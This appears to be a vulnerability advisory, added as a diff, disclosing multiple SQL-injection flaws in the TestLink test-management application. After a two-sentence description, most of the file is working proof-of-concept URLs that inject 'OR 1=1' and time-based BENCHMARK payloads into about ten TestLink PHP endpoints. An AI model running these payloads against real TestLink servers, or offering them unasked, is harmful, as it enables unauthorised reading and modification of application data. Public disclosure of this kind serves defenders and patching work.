@@ -1,0 +1,24 @@
+source: http://www.securityfocus.com/bid/52086/info
+
+TestLink is prone to multiple SQL-injection vulnerabilities because the application fails to properly sanitize user-supplied input before using it in an SQL query.
+
+A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database.
+
+http://www.example.com/lib/ajax/getrequirementnodes.php?root_node=1 OR 1=1
+http://www.example.com/lib/ajax/gettprojectnodes.php?root_node=4 OR 1=1
+http://www.example.com/lib/cfields/cfieldsEdit.php?do_action=edit&cfield_id=1 AND
+3653=BENCHMARK(5000000,MD5(1))
+http://www.example.com/lib/plan/planMilestonesEdit.php?doAction=edit&id=7
+AND 5912=BENCHMARK(5000000,MD5(1))
+http://www.example.com/lib/plan/planMilestonesEdit.php?doAction=create&tplan_id=2623
+AND 5912=BENCHMARK(5000000,MD5(1))
+http://www.example.com/lib/requirements/reqEdit.php?doAction=create&req_spec_id=2622
+AND 5912=BENCHMARK(5000000,MD5(1))
+http://www.example.com/lib/requirements/reqImport.php?req_spec_id=2622 AND
+5912=BENCHMARK(5000000,MD5(1))
+http://www.example.com/lib/requirements/reqSpecAnalyse.php?req_spec_id=2622
+OR 1=1
+http://www.example.com/lib/requirements/reqSpecPrint.php?req_spec_id=2622
+AND 5912=BENCHMARK(5000000,MD5(1))
+http://www.example.com/lib/requirements/reqSpecView.php?req_spec_id=2622 AND
+5912=BENCHMARK(5000000,MD5(1)) 
